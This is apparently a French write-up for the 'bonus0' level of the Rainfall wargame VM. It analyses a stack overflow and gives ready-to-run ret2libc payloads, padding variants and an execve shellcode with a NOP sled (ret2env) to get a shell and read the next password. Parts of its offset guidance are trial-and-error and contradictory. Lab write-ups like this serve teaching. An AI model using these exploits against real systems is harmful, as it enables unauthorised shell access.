# Bonus0 — Commandes

## Connexion

Se connecter comme **bonus0** (mot de passe = contenu de `level9/flag`) :

```bash
ssh bonus0@localhost -p 4242
```

Ou obtenir un shell bonus0 via l’exploit level9.

---

## Recon

```bash
ls -la
file bonus0
./bonus0
```

Le programme **ne prend pas d’arguments** : il affiche ` - ` et lit une ligne, puis réaffiche ` - ` et lit une deuxième ligne, puis affiche la concaténation (séparée par un espace).

---

## Extraction du binaire (depuis l’hôte)

Dans le répertoire `bonus0/` :

```bash
sshpass -p "$(cat ../level9/flag)" scp -o StrictHostKeyChecking=no -P 4242 bonus0@localhost:bonus0 ./bonus0.bin
```

```bash
file bonus0.bin
strings bonus0.bin
objdump -d bonus0.bin | head -200
```

---

## Analyse (source reconstituée)

Voir `source.c`. En résumé :

- **p(dest, prompt)** : affiche `" - "`, lit jusqu’à 4096 octets, remplace `\n` par `\0`, copie **20 octets** dans `dest` (strncpy).
- **pp(dest)** : appelle `p` deux fois (buf1, buf2 de 20 octets chacun), puis `strcpy(dest, buf1)`, ajoute un espace, puis `strcat(dest, buf2)`.
- **main** : buffer de **42 octets** (esp+0x16, frame 0x40), appelle `pp(buffer)` puis `puts(buffer)`.

On écrit donc **20 + 2 + 20 = 42 octets** dans un buffer de 42 octets : le `\0` final est écrit **après** le buffer → overflow d’au moins 1 octet (saved EBP). En pratique, selon l’alignement, on peut écraser **saved EBP (4) + adresse de retour (4)** en remplissant les 34 premiers octets, puis 8 octets de payload.

---

## GDB — Offset et adresses

Sur la VM :

```bash
gdb -q ./bonus0
```

**Mesurer l’offset (saved EIP) avec le payload :**

Créer le payload puis dans GDB :

```bash
mkfifo /tmp/fifo 2>/dev/null
# Shell : créer le payload (n’importe quelle 2ᵉ ligne de 20 octets)
python -c '
f=open("/tmp/fifo","wb"); f.write(b"A"*20+b"\n"); f.flush(); import time; time.sleep(1); f.write(b"B"*20+b"\n"); f.close()
' &
# Lancer d'abord mkfifo, puis dans l'autre terminal : gdb -q ./bonus0, break *0x80485a3, run < /tmp/fifo
```

```gdb
break *0x80485a3
run < /tmp/fifo
```

**Pourquoi pas `run < /tmp/payload` avec 20+20 octets ?** Le premier `read(0,buf,0x1000)` lit **tout** le fichier (42 octets) d’un coup ; le second `p()` reçoit 0 octet → `strchr(buf,'\n')` = NULL → segfault. Deux solutions : **FIFO** (ci‑dessus) ou **astuce 4095** ci‑dessous.

**Astuce 4095 (fichier utilisable en GDB)** : `read()` lit jusqu’à **0x1000 = 4096** octets. Si la 1ʳᵉ ligne fait **4095 octets + `\n`**, le premier `read()` consomme exactement 4096 octets ; le second `read()` lit alors la 2ᵉ ligne. On peut donc faire `run < /tmp/payload` en GDB avec un payload ainsi formé :

```bash
# Payload « 4095 » : 1ʳᵉ ligne = 4095 octets + \n, 2ᵉ = notre overflow (20 octets + \n)
python -c '
with open("/tmp/payload", "wb") as f:
    f.write(b"A"*4095 + b"\n")
    f.write(b"B"*20 + b"\n")   # ou le vrai payload ret2libc
'
gdb -q ./bonus0
# (gdb) break *0x80485a3
# (gdb) run < /tmp/payload
```

À la breakpoint, l’argument de `pp` (buffer de main) est à `ebp+8`. La saved EIP qu’on va écraser est à `ebp+4`. **Offset** (octets du début du buffer jusqu’à la saved EIP) :

```gdb
# Méthode fiable : afficher les deux adresses puis calculer
p/x *(void**)($ebp+8)
p/x (char*)$ebp + 4
```

Noter **buffer** (1ʳᵉ valeur) et **addr_ret** (2ᵉ). Puis : **offset = addr_ret − buffer** (en décimal). Si la formule en une ligne donne un nombre aberrant (ex. 2109584618), utiliser cette méthode.

Alternative : `p/d ((char*)$ebp + 4) - (char*)*(void**)($ebp+8)` (doit donner un petit entier, ex. 28–46).

- Si **offset ≤ 33** : on tient system + /bin/sh dans nos 20 octets. **Padding = offset − 21** (ex. offset 33 → 12 octets).
- Si **offset > 33** (ex. 38 ou 46) : la saved EIP est au-delà de nos 20 octets ; ce qui l’écrase vient de la pile (d’où la chaîne « cat /home/user/bonus » dans la sortie). Il faut que le **buffer réel** soit plus petit que 42 sur ta VM, ou essayer d’autres paddings (7, 9, 10) au cas où l’offset serait 28–31.

Puis récupérer **system** et **"/bin/sh"** :

```gdb
p system
# ou : info function system
find &system,+9999999,"/bin/sh"
```

Sinon, mettre **"/bin/sh"** en variable d’environnement et en GDB après `run` :

```gdb
x/s environ
# ou parcourir les chaînes pour trouver BINSH=/bin/sh
```

---

## Exploitation (ret2libc via stdin)

On envoie **deux lignes** au programme.

- **Ligne 1** : 20 octets quelconques (remplissent buf1), par ex. `"A"*20`.
- **Ligne 2** :  
  - 12 octets de padding (pour atteindre l’offset 34 depuis le début du buffer),  
  - 4 octets (saved EBP, junk),  
  - 4 octets = adresse de **system** (little-endian).

Cela écrase l’adresse de retour de `main` par `system`. Pour que `system` reçoive **"/bin/sh"** en argument, il faut que les **4 octets suivant** l’adresse de retour (ce que `system` lit en esp+4) soient l’adresse de la chaîne. On ne contrôle que 42 octets, donc on ne peut pas les écrire dans le payload. Il faut soit :

- mettre **"/bin/sh"** en **variable d’environnement** et trouver son adresse en GDB (souvent proche de la stack), soit  
- utiliser un **gadget** ou une autre technique selon la VM.

Exemple (adresses VM : system `0xb7e6b060`, `/bin/sh` `0xb7f8cc58`) :

```bash
( python -c '
import sys
sys.stdout.write("A"*20 + "\n")
sys.stdout.write("B"*2 + "\x00\x00\x00\x00" + "\x60\xb0\xe6\xb7" + "CCCC" + "\x58\xcc\xf8\xb7" + "\n")
' ; cat ) | ./bonus0
```

---

## Solution directe

**Sur la VM Rainfall, la méthode qui fonctionne est ret2env** (shellcode dans l’env, adresse nopsled) — voir la section **« Alternative : ret2env »** plus bas pour la procédure complète. La méthode ret2libc ci‑dessous peut donner un offset GDB aberrant ; dans ce cas utiliser ret2env.

Avec les adresses trouvées en GDB sur la VM (ret2libc) :
- **system** : `0xb7e6b060`
- **"/bin/sh"** (libc) : `0xb7f8cc58`

Pour appeler `system("/bin/sh")` il faut écraser : saved EBP (4) + ret (4) + ret pour system (4) + argument (4) = 16 octets après le début du buffer. Si l’offset jusqu’à saved EBP est **24** octets, alors 24 + 16 = 40 octets de payload : ligne1 = 20, espace = 2, ligne2 = 18 (2 padding + 4+4+4+4).

**Commande finale (à lancer sur la VM en bonus0) :**

Le payload doit être envoyé **en entier** avant toute saisie clavier. Avec `( python ; cat )` la 2ᵉ ligne peut être ta saisie si le buffer n’est pas vidé. Deux méthodes :

**Méthode 1 — Fichier payload (recommandé)**  
Tout se fait **dans le shell** (pas dans GDB). Créer le fichier, puis lancer le pipe :

```bash
# 1) Créer le payload (dans le shell)
# Pas de \x00 dans la 2ᵉ ligne (strncpy s’arrête au premier null).
# Offset 33 : 12 octets padding + system (4) + /bin/sh (4) = 20 octets.
# Si GDB donne un autre offset OFF (21..33) : padding = OFF-21 octets, puis system, puis /bin/sh.
python -c '
with open("/tmp/payload", "wb") as f:
    f.write("A"*20 + "\n")
    f.write("B"*12 + "\x60\xb0\xe6\xb7" + "\x58\xcc\xf8\xb7" + "\n")
'

# 2) Lancer l’exploit (dans le shell)
( cat /tmp/payload ; cat ) | ./bonus0
```

**Important :** ne rien taper au clavier avant d’avoir vu les **deux** lignes ` - `.  
Une fois les deux ` - ` affichés, taper : `cat /home/user/bonus1/.pass`

**Variante fichier « 4095 »** (1ʳᵉ ligne = 4095 octets + `\n` pour que le 2ᵉ `read()` prenne bien la 2ᵉ ligne ; permet aussi `run < /tmp/payload` en GDB sans FIFO) :

```bash
python -c '
with open("/tmp/payload", "wb") as f:
    f.write(b"A"*4095 + b"\n")
    f.write(b"B"*12 + b"\x60\xb0\xe6\xb7\x58\xcc\xf8\xb7" + b"\n")
'
cat /tmp/payload - | ./bonus0
```

Le `-` garde stdin ouvert après le fichier pour le shell. Si aucun padding ne donne de shell, tester 7, 9, 10 à la place de 12 dans la 2ᵉ ligne.

---

## Procédure finale (si l’offset GDB est aberrant, ex. 2109584618)

Sans offset fiable, tester **chaque padding** (7, 9, 10, 12) jusqu’à obtenir un shell. Adresses VM : **system** `0xb7e6b060`, **/bin/sh** `0xb7f8cc58`. 2ᵉ ligne = **20 octets** : `padding × "B"` + system (4) + /bin/sh (4) + éventuellement du remplissage pour atteindre 20 octets.

**Ne rien taper avant les deux ` - `.** Puis taper : `cat /home/user/bonus1/.pass`

```bash
# Padding 7
python -c 'f=open("/tmp/p","wb"); f.write(b"A"*20+b"\n"+b"B"*7+b"\x60\xb0\xe6\xb7\x58\xcc\xf8\xb7"+b"X"*5+b"\n"); f.close()'
( cat /tmp/p ; cat ) | ./bonus0
```

```bash
# Padding 9
python -c 'f=open("/tmp/p","wb"); f.write(b"A"*20+b"\n"+b"B"*9+b"\x60\xb0\xe6\xb7\x58\xcc\xf8\xb7"+b"X"*3+b"\n"); f.close()'
( cat /tmp/p ; cat ) | ./bonus0
```

```bash
# Padding 10
python -c 'f=open("/tmp/p","wb"); f.write(b"A"*20+b"\n"+b"B"*10+b"\x60\xb0\xe6\xb7\x58\xcc\xf8\xb7"+b"XX\n"); f.close()'
( cat /tmp/p ; cat ) | ./bonus0
```

```bash
# Padding 12 (déjà dans Méthode 1)
python -c 'f=open("/tmp/p","wb"); f.write(b"A"*20+b"\n"+b"B"*12+b"\x60\xb0\xe6\xb7\x58\xcc\xf8\xb7\n"); f.close()'
( cat /tmp/p ; cat ) | ./bonus0
```

Dès qu’un des runs ouvre un shell (prompt sans segfault), exécuter `cat /home/user/bonus1/.pass` et noter le mot de passe dans `bonus0/flag`.

**Méthode 2 — Python unbuffered + flush**

```bash
( python -u -c '
import sys
sys.stdout.write("A"*20 + "\n")
sys.stdout.flush()
sys.stdout.write("B"*12 + "\x60\xb0\xe6\xb7" + "\x58\xcc\xf8\xb7" + "\n")
sys.stdout.flush()
' ; cat ) | ./bonus0
```

Ne rien taper avant que les deux lignes soient lues (les deux ` - ` affichés). Ensuite taper la commande pour le flag.

**Pour plus d’infos en cas de segfault** : créer `/tmp/payload` **dans le shell** (commande python ci‑dessus), puis :

```bash
gdb -q ./bonus0
```

**Dans GDB uniquement** (pas les commandes shell) :

```gdb
run < /tmp/payload
```

Au crash : `info registers`, `x/i $eip`, `x/20wx $esp`

**Si segfault avec le payload complet** :  
1. Mesurer l’offset en GDB (commande ci‑dessus). Si **offset > 33**, la saved EIP n’est pas dans nos 20 octets → essayer d’autres paddings.  
2. Tester plusieurs paddings (padding = octets avant system dans la 2ᵉ ligne) :

```bash
# Padding 7 (offset 28)
python -c 'f=open("/tmp/p","wb"); f.write("A"*20+"\n"+"B"*7+"\x60\xb0\xe6\xb7\x58\xcc\xf8\xb7"+"X"*5+"\n"); f.close()'
( cat /tmp/p ; cat ) | ./bonus0

# Padding 9 (offset 30)
python -c 'f=open("/tmp/p","wb"); f.write("A"*20+"\n"+"B"*9+"\x60\xb0\xe6\xb7\x58\xcc\xf8\xb7"+"X"*3+"\n"); f.close()'
( cat /tmp/p ; cat ) | ./bonus0

# Padding 10 (offset 31)
python -c 'f=open("/tmp/p","wb"); f.write("A"*20+"\n"+"B"*10+"\x60\xb0\xe6\xb7\x58\xcc\xf8\xb7"+"XX\n"); f.close()'
( cat /tmp/p ; cat ) | ./bonus0

# Padding 12 (offset 33) — déjà dans Méthode 1
```

---

## Alternative : ret2env (shellcode dans l’environnement)

Au lieu de ret2libc, on met un **shellcode** dans une variable d’environnement et on redirige EIP vers le nopsled. Le buffer ne contient que 20 octets, d’où l’usage de l’env.

**Shellcode** (exéc `/bin/sh`, à mettre dans la variable `payload`) :

```bash
# Définir la variable une fois (bien fermer par " puis ' puis ) )
export PAYLOAD=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
```

1. **Trouver l’adresse du nopsled** :  
   `env -i payload=$PAYLOAD gdb ./bonus0` puis `b main`, `r`, `x/500s environ` et noter une adresse dans les NOPs (ex. `0xbffffe57`).

2. **Payload fichier** (astuce 4095) : 1ʳᵉ ligne = 4095 octets + `\n`, 2ᵉ = 9 octets + adresse nopsled (little-endian) + 7 octets. Ex. adresse `0xbffffe57` → `"\x57\xfe\xff\xbf"`.

0xbffffd8f
```bash
python -c 'open("/tmp/file","wb").write("B"*4095+"\n"+"A"*9+"\x57\xfe\xff\xbf"+"B"*7+"\n")'
```

3. **Lancer** :  
   `cat /tmp/file - | env -i payload=$PAYLOAD ./bonus0`  
   Puis taper `cat /home/user/bonus1/.pass`. Le `-` garde stdin ouvert pour le shell.

Même overflow (EIP écrasé par la 2ᵉ entrée) ; on saute vers le shellcode en env au lieu de ret2libc.

---

## Récupération du flag

```bash
cat /home/user/bonus1/.pass
```

Noter le mot de passe dans `bonus0/flag`.
